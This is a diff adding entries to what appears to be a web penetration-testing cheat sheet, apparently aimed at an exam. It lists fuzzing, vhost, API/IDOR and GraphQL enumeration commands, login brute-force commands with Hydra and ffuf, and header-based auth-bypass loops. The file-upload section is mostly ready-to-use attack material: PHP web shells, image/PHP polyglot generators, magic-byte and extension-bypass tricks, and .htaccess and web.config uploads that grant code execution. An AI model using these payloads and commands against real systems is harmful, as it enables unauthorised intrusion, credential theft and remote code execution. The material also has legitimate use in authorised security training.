+      {l:"Quick check",t:"# Check common sensitive files:\nfor f in .env .git/HEAD .svn/entries .DS_Store .htpasswd .htaccess robots.txt sitemap.xml crossdomain.xml wp-config.php.bak web.config.bak server-status server-info phpinfo.php info.php test.php; do\n  code=$(curl -s -o /dev/null -w '%{http_code}' http://{{target}}/$f)\n  [ \"$code\" != \"404\" ] && echo \"[${code}] $f\"\ndone"},
+      {l:"SecLists check",t:"ffuf -u http://{{target}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common-and-sensitive.txt -mc 200,301,302,403"},
+      {l:"Database files",t:"ffuf -u http://{{target}}/FUZZ -mc 200 -w - \x3c\x3c 'EOF'\ndump.sql\nbackup.sql\ndb.sql\ndatabase.sql\ndata.sql\nsite.sql\ndb.sqlite\ndb.sqlite3\ndata.db\nEOF"},
+    ],note:"Always check .env, .git/HEAD, phpinfo.php, server-status, and database dumps."},
+    {name:"Git / SVN / Source Exposure",tags:["cmd"],cmds:[
+      {l:".git check",t:"curl -s http://{{target}}/.git/HEAD\ncurl -s http://{{target}}/.git/config"},
+      {l:".git dump",t:"git-dumper http://{{target}}/.git/ ./git-dump/\ncd git-dump && git log --oneline && git show"},
+      {l:".svn check",t:"curl -s http://{{target}}/.svn/entries\ncurl -s http://{{target}}/.svn/wc.db"},
+      {l:".DS_Store",t:"curl -s http://{{target}}/.DS_Store | strings"},
+    ],note:"Exposed .git leaks ALL source code and history. .svn/wc.db contains filenames. .DS_Store lists directory contents."},
+  ]},
+  {section:"vHost / Virtual Host Fuzzing",items:[
+    {name:"ffuf vHost Fuzz",tags:["cmd"],cmds:[
+      {l:"Basic vhost",t:"ffuf -u http://{{target}} -H 'Host: FUZZ.{{target}}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs SIZE_OF_DEFAULT"},
+      {l:"Large wordlist",t:"ffuf -u http://{{target}} -H 'Host: FUZZ.{{target}}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs SIZE_OF_DEFAULT -t 40"},
+      {l:"By IP",t:"ffuf -u http://TARGET_IP -H 'Host: FUZZ.{{target}}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs SIZE_OF_DEFAULT"},
+    ],note:"vHost fuzzing finds sites on same server. ALWAYS filter default response size (-fs). Get default size by requesting with random Host header."},
+    {name:"Gobuster vHost",tags:["cmd"],cmds:[
+      {l:"vhost mode",t:"gobuster vhost -u http://{{target}} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain"},
+      {l:"Exclude length",t:"gobuster vhost -u http://{{target}} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 0"},
+    ],note:"--append-domain makes FUZZ become FUZZ.target.com. Without it, FUZZ is sent as the full Host header."},
+    {name:"wfuzz vHost",tags:["cmd"],cmds:[
+      {l:"vhost fuzz",t:"wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://{{target}} -H 'Host: FUZZ.{{target}}' --hh CHARS_OF_DEFAULT"},
+    ],note:"Use --hh to hide by char count of default response."},
+  ]},
+  {section:"API Endpoint Fuzzing",items:[
+    {name:"ffuf REST API Fuzz",tags:["cmd"],cmds:[
+      {l:"API paths",t:"ffuf -u http://{{target}}/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,204,301,302,401,403,405"},
+      {l:"API versioned",t:"ffuf -u http://{{target}}/api/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,201,204,301,302,401,403"},
+      {l:"API root paths",t:"ffuf -u http://{{target}}/FUZZ -mc 200,301,302,401,403 -w - \x3c\x3c 'EOF'\napi\napi/v1\napi/v2\napi/v3\nrest\nrest/v1\ngraphql\nswagger\nswagger.json\nswagger.yaml\nopenapi.json\napi-docs\nredoc\napi/docs\napi/swagger\n_api\nv1\nv2\nEOF"},
+      {l:"Multi-version",t:"# Fuzz API version numbers:\nffuf -u http://{{target}}/api/vFUZZ/users -w /usr/share/seclists/Fuzzing/1-20.txt -mc 200,301,401,403"},
+      {l:"API with auth",t:"ffuf -u http://{{target}}/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -H 'Authorization: Bearer TOKEN_HERE' -mc 200,201,204"},
+    ],note:"API fuzzing: always include 401/403 (might be auth bypass). Check /swagger.json, /openapi.json, /api-docs for documentation."},
+    {name:"ffuf API Methods",tags:["cmd"],cmds:[
+      {l:"Method fuzz",t:"# Test different HTTP methods on an endpoint:\nfor method in GET POST PUT DELETE PATCH OPTIONS HEAD TRACE; do\n  code=$(curl -s -o /dev/null -w '%{http_code}' -X $method http://{{target}}/api/users)\n  echo \"[$code] $method /api/users\"\ndone"},
+      {l:"ffuf method",t:"ffuf -u http://{{target}}/api/admin -X FUZZ -w - -mc 200,201,204,301,302,401,403,405 \x3c\x3c 'EOF'\nGET\nPOST\nPUT\nDELETE\nPATCH\nOPTIONS\nHEAD\nTRACE\nEOF"},
+    ],note:"Some endpoints allow PUT/DELETE but block GET. OPTIONS response reveals allowed methods."},
+    {name:"API Object ID Fuzz (IDOR)",tags:["cmd"],cmds:[
+      {l:"Numeric IDs",t:"ffuf -u http://{{target}}/api/users/FUZZ -w /usr/share/seclists/Fuzzing/1-1000.txt -mc 200 -H 'Authorization: Bearer TOKEN'"},
+      {l:"UUID fuzz",t:"# If API uses UUIDs, try common patterns:\nffuf -u http://{{target}}/api/users/FUZZ/profile -w collected_uuids.txt -mc 200 -H 'Authorization: Bearer TOKEN'"},
+      {l:"Param IDOR",t:"# Change user ID in parameter:\nffuf -u 'http://{{target}}/api/profile?user_id=FUZZ' -w /usr/share/seclists/Fuzzing/1-1000.txt -mc 200 -H 'Authorization: Bearer TOKEN'"},
+    ],note:"IDOR: try accessing other users' data by fuzzing IDs. Compare response size to find valid IDs."},
+    {name:"GraphQL Fuzzing",tags:["cmd"],cmds:[
+      {l:"Introspection",t:"curl -s -X POST http://{{target}}/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name,fields{name,args{name}}}}}\"}' | jq ."},
+      {l:"All queries",t:"curl -s -X POST http://{{target}}/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{queryType{fields{name description}}}}\"}' | jq ."},
+      {l:"All mutations",t:"curl -s -X POST http://{{target}}/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{mutationType{fields{name description args{name type{name}}}}}}\"}' | jq ."},
+      {l:"Batch query",t:"curl -s -X POST http://{{target}}/graphql -H 'Content-Type: application/json' -d '[{\"query\":\"{user(id:1){name email}}\"},{\"query\":\"{user(id:2){name email}}\"}]'"},
+      {l:"Endpoint fuzz",t:"ffuf -u http://{{target}}/FUZZ -mc 200,405 -w - \x3c\x3c 'EOF'\ngraphql\ngraphiql\naltair\nplayground\nconsole\nquery\ngraphql/console\nv1/graphql\napi/graphql\nEOF"},
+    ],note:"GraphQL: introspection reveals entire schema. Batch queries bypass rate limiting. Check for /graphiql (interactive IDE)."},
+    {name:"Swagger / API Docs Discovery",tags:["cmd"],cmds:[
+      {l:"Swagger files",t:"ffuf -u http://{{target}}/FUZZ -mc 200 -w - \x3c\x3c 'EOF'\nswagger.json\nswagger.yaml\nswagger/v1/swagger.json\napi-docs\napi/swagger.json\napi/v1/swagger.json\nopenapi.json\nopenapi.yaml\nv2/api-docs\nv3/api-docs\nswagger-ui.html\nswagger-resources\napi/swagger-resources\n.well-known/openapi.json\ndocs\nredoc\nEOF"},
+    ],note:"Swagger/OpenAPI docs expose ALL endpoints, parameters, and sometimes example requests. Gold mine for API testing."},
+  ]},
+  {section:"Parameter & Value Fuzzing",items:[
+    {name:"ffuf GET Parameter Names",tags:["cmd"],cmds:[
+      {l:"Param names",t:"ffuf -u 'http://{{target}}/page?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -fs SIZE_OF_NO_PARAM"},
+      {l:"Common params",t:"ffuf -u 'http://{{target}}/page?FUZZ=1' -mc 200 -fs SIZE_OF_NO_PARAM -w - \x3c\x3c 'EOF'\nid\npage\nfile\npath\nurl\nredirect\nnext\ndata\ncmd\nexec\nquery\nsearch\nuser\nusername\nemail\npassword\ntoken\napi_key\ncallback\ntemplate\ninclude\nview\naction\ntype\ncategory\nlang\ndebug\ntest\nadmin\nconfig\nEOF"},
+    ],note:"First request without params to get default size, then -fs to filter. These params often lead to vulns (LFI, SSRF, SQLi)."},
+    {name:"ffuf POST Parameter Names",tags:["cmd"],cmds:[
+      {l:"POST params",t:"ffuf -u http://{{target}}/login -X POST -d 'FUZZ=test' -H 'Content-Type: application/x-www-form-urlencoded' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -fs SIZE_OF_DEFAULT"},
+      {l:"JSON params",t:"ffuf -u http://{{target}}/api/login -X POST -d '{\"FUZZ\":\"test\"}' -H 'Content-Type: application/json' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200 -fs SIZE_OF_DEFAULT"},
+    ],note:"Fuzz POST parameters in form-encoded and JSON formats. Check for hidden parameters not in the UI."},
+    {name:"ffuf Parameter Value Fuzzing",tags:["cmd"],cmds:[
+      {l:"ID values",t:"ffuf -u 'http://{{target}}/page?id=FUZZ' -w /usr/share/seclists/Fuzzing/1-1000.txt -mc 200 -fs SIZE_OF_INVALID"},
+      {l:"LFI payloads",t:"ffuf -u 'http://{{target}}/page?file=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200 -fs SIZE_OF_DEFAULT"},
+      {l:"SQLi payloads",t:"ffuf -u 'http://{{target}}/page?id=FUZZ' -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt -mc 200 -fs SIZE_OF_NORMAL"},
+      {l:"XSS payloads",t:"ffuf -u 'http://{{target}}/search?q=FUZZ' -w /usr/share/seclists/Fuzzing/XSS/XSS-BruteLogic.txt -mc 200 -fs SIZE_OF_DEFAULT"},
+      {l:"Username enum",t:"ffuf -u http://{{target}}/login -X POST -d 'username=FUZZ&password=invalid' -H 'Content-Type: application/x-www-form-urlencoded' -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -fs SIZE_OF_INVALID_USER"},
+    ],note:"Value fuzzing finds SQLi, LFI, XSS. Always compare against baseline size for filtering."},
+    {name:"ffuf Header Fuzzing",tags:["cmd"],cmds:[
+      {l:"Auth bypass hdrs",t:"# Try headers that bypass auth:\nfor h in 'X-Forwarded-For: 127.0.0.1' 'X-Original-URL: /admin' 'X-Rewrite-URL: /admin' 'X-Custom-IP-Authorization: 127.0.0.1' 'X-Forwarded-Host: localhost' 'X-Remote-IP: 127.0.0.1' 'X-Remote-Addr: 127.0.0.1'; do\n  code=$(curl -s -o /dev/null -w '%{http_code}' -H \"$h\" http://{{target}}/admin)\n  echo \"[$code] $h\"\ndone"},
+      {l:"IP rotation",t:"ffuf -u http://{{target}}/admin -H 'X-Forwarded-For: FUZZ' -w /usr/share/seclists/Fuzzing/ip-addresses.txt -mc 200"},
+    ],note:"X-Forwarded-For, X-Original-URL, X-Rewrite-URL can bypass IP restrictions and path-based auth."},
+    {name:"Arjun Parameter Discovery",tags:["cmd"],cmds:[
+      {l:"GET params",t:"arjun -u http://{{target}}/page -m GET"},
+      {l:"POST params",t:"arjun -u http://{{target}}/page -m POST"},
+      {l:"JSON params",t:"arjun -u http://{{target}}/api/endpoint -m JSON"},
+      {l:"From file",t:"arjun -u http://{{target}}/page --include /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"},
+    ],note:"Arjun auto-detects hidden parameters. More intelligent than raw ffuf fuzzing but slower."},
+    {name:"ParamSpider + Mining",tags:["cmd"],cmds:[
+      {l:"Mine params",t:"paramspider -d {{target}} -o params.txt"},
+      {l:"From wayback",t:"waybackurls {{target}} | grep '=' | uro | tee params-wayback.txt"},
+      {l:"Extract params",t:"cat params-wayback.txt | grep -oP '\\?[^#]+' | tr '&' '\\n' | cut -d= -f1 | sort -u"},
+    ],note:"Mine parameter names from web archives. These are KNOWN valid parameters."},
+  ]},
+  {section:"Wordlist Reference Guide",items:[
+    {name:"Directory Wordlists (SecLists)",tags:["cmd"],cmds:[
+      {l:"Quick/Small",t:"# ~4600 entries - fast first pass:\n/usr/share/wordlists/dirb/common.txt\n/usr/share/seclists/Discovery/Web-Content/common.txt"},
+      {l:"Medium",t:"# ~220K entries - standard scan:\n/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt\n/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt"},
+      {l:"Large/Thorough",t:"# ~1.3M entries - exhaustive:\n/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt"},
+      {l:"Tech-specific",t:"# CMS & framework specific:\n/usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt\n/usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt\n/usr/share/seclists/Discovery/Web-Content/tomcat.txt\n/usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt\n/usr/share/seclists/Discovery/Web-Content/nginx.txt\n/usr/share/seclists/Discovery/Web-Content/apache.txt"},
+    ],note:"Start small (common.txt), go larger if needed. raft-large covers both dirs and files."},
+    {name:"Subdomain Wordlists",tags:["cmd"],cmds:[
+      {l:"Quick",t:"/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"},
+      {l:"Standard",t:"/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt"},
+      {l:"Large",t:"/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt"},
+      {l:"Bitquark",t:"/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt"},
+    ],note:"5K is fast first pass. 20K is standard. 110K for thorough. Bitquark is alternative source."},
+    {name:"Parameter & API Wordlists",tags:["cmd"],cmds:[
+      {l:"Param names",t:"/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"},
+      {l:"API endpoints",t:"/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt\n/usr/share/seclists/Discovery/Web-Content/api/api-seen-in-wild.txt"},
+      {l:"Fuzzing values",t:"/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt\n/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt\n/usr/share/seclists/Fuzzing/XSS/XSS-BruteLogic.txt\n/usr/share/seclists/Fuzzing/command-injection-commix.txt"},
+      {l:"Usernames",t:"/usr/share/seclists/Usernames/top-usernames-shortlist.txt\n/usr/share/seclists/Usernames/Names/names.txt"},
+      {l:"Passwords",t:"/usr/share/wordlists/rockyou.txt\n/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt"},
+    ],note:"SecLists is the most important wordlist collection. Install: apt install seclists."},
+    {name:"Custom Wordlist Generation",tags:["cmd"],cmds:[
+      {l:"CeWL from site",t:"cewl http://{{target}} -d 3 -m 5 -w custom-wordlist.txt"},
+      {l:"CeWL with email",t:"cewl http://{{target}} -d 3 -m 5 -w custom-words.txt -e --email_file emails.txt"},
+      {l:"From JS files",t:"katana -u http://{{target}} -em js -silent | while read u; do curl -s \"$u\"; done | grep -oP '[a-zA-Z_][a-zA-Z0-9_]{2,}' | sort -u > js-words.txt"},
+      {l:"Combine + sort",t:"cat /usr/share/wordlists/dirb/common.txt custom-wordlist.txt js-words.txt | sort -u > combined.txt"},
+    ],note:"CeWL scrapes target site to build custom wordlist. Always combine with standard lists."},
+  ]},
+  {section:"Crawling & JS Analysis",items:[
+    {name:"Katana Deep Crawl",tags:["cmd"],cmds:[
+      {l:"Full crawl",t:"katana -u http://{{target}} -d 5 -jc -kf all -silent"},
+      {l:"JS files only",t:"katana -u http://{{target}} -em js,json -jc -d 3 -silent"},
+      {l:"With scope",t:"katana -u http://{{target}} -d 5 -jc -kf all -silent -cs {{target}}"},
+      {l:"Headless mode",t:"katana -u http://{{target}} -d 3 -jc -hl -silent"},
+    ],note:"Katana: -jc crawl JS, -kf known files, -hl headless browser mode, -cs scope constraint."},
+    {name:"Hakrawler",tags:["cmd"],cmds:[
+      {l:"Crawl",t:"hakrawler -url http://{{target}} -depth 3 -plain"},
+    ],note:"Fast web crawler for endpoints."},
+    {name:"GoSpider",tags:["cmd"],cmds:[
+      {l:"Spider",t:"gospider -s http://{{target}} -d 2 -c 10"},
+      {l:"With subs",t:"gospider -s http://{{target}} -d 2 -c 10 --subs"},
+    ],note:"Discovers links, forms, JS files. --subs includes subdomains."},
+    {name:"SecretFinder - JS Secrets",tags:["cmd"],cmds:[
+      {l:"Single JS",t:"python3 SecretFinder.py -i http://{{target}}/app.js -o cli"},
+      {l:"All JS",t:"katana -u http://{{target}} -em js -silent | while read url; do python3 SecretFinder.py -i \"$url\" -o cli; done"},
+    ],note:"Finds API keys, tokens, secrets in JavaScript files."},
+    {name:"LinkFinder",tags:["cmd"],cmds:[
+      {l:"Endpoints",t:"python3 linkfinder.py -i http://{{target}}/app.js -o cli"},
+    ],note:"Discovers endpoints and paths in JavaScript."},
+    {name:"Wayback URL Mining",tags:["cmd"],cmds:[
+      {l:"Wayback",t:"waybackurls {{target}} | grep -E '\\.php|\\.asp|login|admin|api|upload|backup|config|token|key' | sort -u"},
+      {l:"GAU",t:"gau {{target}} | uro | tee all-urls.txt"},
+      {l:"Extract endpoints",t:"cat all-urls.txt | grep -oP 'https?://[^/]+\\K/[^?#]*' | sort -u | tee paths.txt"},
+      {l:"Use as wordlist",t:"# Use discovered paths as custom wordlist:\nffuf -u http://{{target}}/FUZZ -w paths.txt -mc 200,301,302,403"},
+    ],note:"Archive URLs make excellent custom wordlists. Extract paths and reuse for fuzzing."},
+  ]},
+  {section:"Fingerprinting & Scanning",items:[
+    {name:"Whatweb + WAF Detection",tags:["cmd"],cmds:[
+      {l:"Fingerprint",t:"whatweb -a 3 http://{{target}}"},
+      {l:"WAF detect",t:"wafw00f http://{{target}}"},
+    ],note:"Identify tech stack and WAF. Knowing the stack determines which wordlists and extensions to use."},
+    {name:"Nikto + Nuclei",tags:["cmd"],cmds:[
+      {l:"Nikto",t:"nikto -h http://{{target}} -o nikto.txt"},
+      {l:"Nuclei CVEs",t:"nuclei -u http://{{target}} -t cves/ -severity critical,high"},
+      {l:"Nuclei all",t:"nuclei -u http://{{target}} -t cves/ -t exposures/ -t misconfigurations/"},
+      {l:"Nuclei on list",t:"cat live-subs.txt | nuclei -t cves/ -t exposures/ -severity critical,high -o nuclei-findings.txt"},
+    ],note:"Automated vulnerability scanning. Run Nuclei against all discovered subdomains."},
+    {name:"CORS Misconfiguration",tags:["cmd"],cmds:[
+      {l:"Test",t:"curl -H 'Origin: https://evil.com' -I http://{{target}}/api/"},
+      {l:"Check headers",t:"curl -sI http://{{target}} | grep -iE 'access-control|x-frame|strict-transport|content-security'"},
+    ],note:"Check for CORS misconfig and missing security headers."},
+    {name:"Nmap HTTP Scripts",tags:["cmd"],cmds:[
+      {l:"Web enum",t:"nmap -p 80,443,8080,8443 --script http-enum,http-title,http-methods,http-robots.txt {{target}}"},
+      {l:"WAF detect",t:"nmap -p 80,443 --script http-waf-detect,http-waf-fingerprint {{target}}"},
+      {l:"Vuln scripts",t:"nmap -p 80,443 --script 'http-vuln*' {{target}}"},
+    ],note:"nmap http-enum discovers common web paths. Slower than ffuf but finds different things."},
+  ]},
+  {section:"Login & Auth Fuzzing",items:[
+    {name:"ffuf Login Brute Force",tags:["cmd"],cmds:[
+      {l:"Username enum",t:"ffuf -u http://{{target}}/login -X POST -d 'username=FUZZ&password=invalid' -H 'Content-Type: application/x-www-form-urlencoded' -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt -mr 'Invalid password' -o valid-users.txt"},
+      {l:"Password brute",t:"ffuf -u http://{{target}}/login -X POST -d 'username=admin&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -fc 401"},
+      {l:"Cluster bomb",t:"ffuf -u http://{{target}}/login -X POST -d 'username=USER&password=PASS' -H 'Content-Type: application/x-www-form-urlencoded' -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:USER -w /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt:PASS -fc 401 -mode clusterbomb"},
+    ],note:"Username enum: different error messages for valid vs invalid users. Cluster bomb tests all user:pass combos."},
+    {name:"Hydra Web Brute Force",tags:["cmd"],cmds:[
+      {l:"HTTP POST form",t:"hydra -l admin -P /usr/share/wordlists/rockyou.txt {{target}} http-post-form '/login:username=^USER^&password=^PASS^:Invalid credentials'"},
+      {l:"HTTP Basic Auth",t:"hydra -l admin -P /usr/share/wordlists/rockyou.txt {{target}} http-get /admin"},
+      {l:"From user list",t:"hydra -L users.txt -P /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt {{target}} http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'"},
+    ],note:"Hydra: F= is failure string, S= is success string. Adjust form fields to match target."},
+  ]},
+],
+
+// ─── FILE UPLOAD ATTACKS ───
+upload:[
+  {section:"Client-Side Validation Bypass",items:[
+    {name:"Disable JS / Intercept with Burp",tags:["bypass"],cmds:[
+      {l:"Method 1",t:"# In Burp: Upload any file -> Intercept request\n# Change filename from 'shell.png' to 'shell.php'\n# Change Content-Type if needed\n# Forward the request"},
+      {l:"Method 2",t:"# Disable JavaScript in browser (F12 -> Settings -> Disable JS)\n# Upload shell.php directly"},
+      {l:"Method 3",t:"# Browser console: remove accept attribute\ndocument.querySelector('input[type=file]').removeAttribute('accept')"},
+    ],note:"Client-side validation is NEVER a real security boundary. Always bypassable."},
+  ]},
+  {section:"Extension Bypass Techniques",items:[
+    {name:"Blacklist Bypass - Alt PHP Extensions",tags:["php","bypass"],cmds:[
+      {l:"PHP alternatives",t:"# Try uploading with these extensions:\n.php .php3 .php4 .php5 .php7 .php8\n.pht .phps .phtml .pgif .phar\n.inc .module .profile"},
+      {l:"Case variants",t:"# Case manipulation:\n.pHp .PhP .PHP .Php .pHP .phP"},
+      {l:"Add trailing",t:"# Trailing characters:\nshell.php. (dot)\nshell.php  (space)\nshell.php%00.png (null byte - old servers)\nshell.php%0a (newline)"},
+    ],note:"Apache: check which extensions are mapped to mod_php in httpd.conf."},
+    {name:"Blacklist Bypass - Alt ASP/JSP Extensions",tags:["asp","bypass"],cmds:[
+      {l:"ASP alternatives",t:".asp .aspx .asa .cer .cdx .ashx .asmx .svc\n.aspx;.jpg (IIS semicolon trick)"},
+      {l:"JSP alternatives",t:".jsp .jspx .jsw .jsv .jtml .jhtml\n.war (deploy as web application)"},
+      {l:"Coldfusion",t:".cfm .cfml .cfc .dbm"},
+    ],note:"IIS semicolon trick: file.aspx;.jpg is parsed as .aspx by IIS."},
+    {name:"Double Extension Attacks",tags:["bypass"],cmds:[
+      {l:"Double ext",t:"shell.php.jpg\nshell.php.png\nshell.php.gif\nshell.asp.jpg"},
+      {l:"Reverse double",t:"shell.jpg.php\nshell.png.php\nshell.gif.phtml"},
+      {l:"Apache specific",t:"# If Apache uses AddHandler:\nshell.php.xxx (Apache processes .php regardless of extra ext)\nshell.php.jpg (works if .jpg not mapped and .php handler exists)"},
+    ],note:"Apache processes right-to-left for extensions. Some apps check only the last ext."},
+    {name:"Null Byte Injection",tags:["bypass"],cmds:[
+      {l:"URL encoded",t:"shell.php%00.jpg\nshell.php%00.png"},
+      {l:"Raw null",t:"# In Burp: Change filename to shell.php\\x00.jpg\n# (use hex editor in repeater)"},
+      {l:"Double encode",t:"shell.php%2500.jpg"},
+    ],note:"Works on older PHP (\x3c5.3.4), some Java apps, and path handling bugs."},
+    {name:"Special Characters in Filename",tags:["bypass"],cmds:[
+      {l:"Various tricks",t:"shell.php%20 (trailing space)\nshell.php. (trailing dot - Windows strips it)\nshell.php.... (multiple dots)\nshell.php/ (trailing slash)\nshell.php::$DATA (NTFS ADS - Windows/IIS)\n./shell.php (dot-slash prefix)"},
+      {l:"Unicode",t:"shell.p\\u0068p\nshell.ph\\x70"},
+      {l:"Overlong UTF-8",t:"# Overlong encoding of '.'\nshell%2ephp"},
+    ],note:"NTFS ADS trick: shell.php::$DATA is saved as shell.php on Windows."},
+  ]},
+  {section:"Content-Type & MIME Bypass",items:[
+    {name:"Content-Type Spoofing",tags:["bypass"],cmds:[
+      {l:"In Burp",t:"# Upload shell.php but change Content-Type header:\nContent-Type: image/jpeg\nContent-Type: image/png\nContent-Type: image/gif\nContent-Type: application/octet-stream"},
+      {l:"curl upload",t:"curl -X POST http://{{target}}/upload \\\n  -F 'file=@shell.php;type=image/jpeg;filename=shell.php'"},
+    ],note:"If app validates Content-Type header, spoof it to match allowed types."},
+    {name:"Magic Bytes / File Signature",tags:["bypass"],cmds:[
+      {l:"PNG header",t:"# Prepend PNG magic bytes to PHP shell:\nprintf '\\x89PNG\\r\\n\\x1a\\n' > shell.php.png\ncat actual_shell.php >> shell.php.png"},
+      {l:"GIF header",t:"GIF89a;\n\x3c?php system($_GET['cmd']); ?>"},
+      {l:"JPEG header",t:"# Prepend JPEG magic:\nprintf '\\xff\\xd8\\xff\\xe0' > shell.php.jpg\ncat actual_shell.php >> shell.php.jpg"},
+      {l:"PDF header",t:"%PDF-1.5\n\x3c?php system($_GET['cmd']); ?>"},
+    ],note:"Many validators only check first few bytes (magic number). GIF89a is easiest to memorize."},
+    {name:"Polyglot Files (Image + PHP)",tags:["bypass","php"],cmds:[
+      {l:"GIF polyglot",t:"GIF89a;\n\x3c?php system($_GET['cmd']); ?>\n# Save as shell.gif.php or inject into image metadata"},
+      {l:"Using exiftool",t:"# Inject PHP into image metadata:\nexiftool -Comment='\x3c?php system($_GET[\"cmd\"]); ?>' legit.jpg\nmv legit.jpg shell.php.jpg"},
+      {l:"PNG IDAT chunk",t:"# Create PHP in valid PNG:\npython3 -c \"\nimport struct, zlib\npng = b'\\x89PNG\\r\\n\\x1a\\n'\nIHDR = struct.pack('>II', 32, 32) + b'\\x08\\x02\\x00\\x00\\x00'\nihdr_crc = struct.pack('>I', zlib.crc32(b'IHDR' + IHDR) & 0xffffffff)\npng += struct.pack('>I', 13) + b'IHDR' + IHDR + ihdr_crc\nphp = b'\x3c?php system(\\$_GET[\\\"cmd\\\"]); ?>'\nidat = zlib.compress(php)\npng += struct.pack('>I', len(idat)) + b'IDAT' + idat\npng += struct.pack('>I', zlib.crc32(b'IDAT' + idat) & 0xffffffff)\npng += struct.pack('>I', 0) + b'IEND' + struct.pack('>I', zlib.crc32(b'IEND') & 0xffffffff)\nwith open('shell.php.png','wb') as f: f.write(png)\n\""},
+    ],note:"Polyglot passes BOTH image validation AND executes as PHP."},
+  ]},
+  {section:"Whitelist Bypass",items:[
+    {name:"Whitelist + Double Extension",tags:["bypass"],cmds:[
+      {l:"Trick",t:"# If whitelist only allows .jpg, .png, .gif:\nshell.php.jpg  (may execute as PHP on Apache with certain configs)\nshell.jpg.php  (if app only checks first extension)"},
+      {l:"Apache conf",t:"# If Apache has: AddHandler application/x-httpd-php .php\n# Then shell.php.jpg WILL execute as PHP\n# Because Apache processes ALL extensions"},
+    ],note:"Depends on server config. Test each combination."},
+    {name:"Whitelist + Content-Type + Magic Bytes COMBO",tags:["bypass"],cmds:[
+      {l:"Full bypass",t:"# 1. Start with valid image (magic bytes pass)\nGIF89a;\n\x3c?php system($_GET['cmd']); ?>\n\n# 2. Save as: shell.gif.php\n# 3. Upload with Burp, set Content-Type: image/gif\n# 4. If filename is rejected, try: shell.php%00.gif"},
+      {l:"Scenario",t:"# Bypass: client-side + blacklist + whitelist + content-type + MIME\n# Steps:\n# 1. Intercept with Burp (bypass client-side)\n# 2. Use .phtml extension (bypass blacklist for .php)\n# 3. Ensure extension in whitelist OR use double ext\n# 4. Set Content-Type: image/gif (bypass content-type check)\n# 5. Prepend GIF89a; to file (bypass magic byte/MIME check)\n# 6. Result: GIF89a;\x3c?php system($_GET['cmd']); ?>"},
+    ],note:"The exam scenario: combine ALL bypass techniques together."},
+  ]},
+  {section:".htaccess & Config Upload",items:[
+    {name:".htaccess Upload",tags:["bypass","php"],cmds:[
+      {l:"Create .htaccess",t:"# Upload .htaccess with content:\nAddType application/x-httpd-php .evil\n\n# Then upload shell.evil which will execute as PHP"},
+      {l:"Override handler",t:"# .htaccess content:\n\x3cFilesMatch \"shell.jpg\">\n  SetHandler application/x-httpd-php\n\x3c/FilesMatch>\n\n# Now upload shell.jpg containing PHP code"},
+      {l:"Enable PHP in dir",t:"# .htaccess content:\nOptions +ExecCGI\nAddHandler php-script .jpg"},
+    ],note:"Only works if AllowOverride is enabled on Apache. Upload .htaccess first, then your shell."},
+    {name:"web.config Upload (IIS)",tags:["bypass","asp"],cmds:[
+      {l:"web.config",t:"\x3c?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\x3cconfiguration>\n  \x3csystem.webServer>\n    \x3chandlers accessPolicy=\"Read, Script, Write\">\n      \x3cadd name=\"web_config\" path=\"*.config\" verb=\"*\" modules=\"IsapiModule\" scriptProcessor=\"%windir%\\system32\\inetsrv\\asp.dll\" resourceType=\"Unspecified\" requireAccess=\"Write\" preCondition=\"bitness64\" />\n    \x3c/handlers>\n    \x3csecurity>\n      \x3crequestFiltering>\n        \x3cfileExtensions>\n          \x3cremove fileExtension=\".config\" />\n        \x3c/fileExtensions>\n      \x3c/requestFiltering>\n    \x3c/security>\n  \x3c/system.webServer>\n\x3c/configuration>\n\x3c!--\n\x3c%Response.write(\"IIS exec\")%>\n-->"},
+    ],note:"If you can upload web.config to IIS, you can get code execution."},
+  ]},
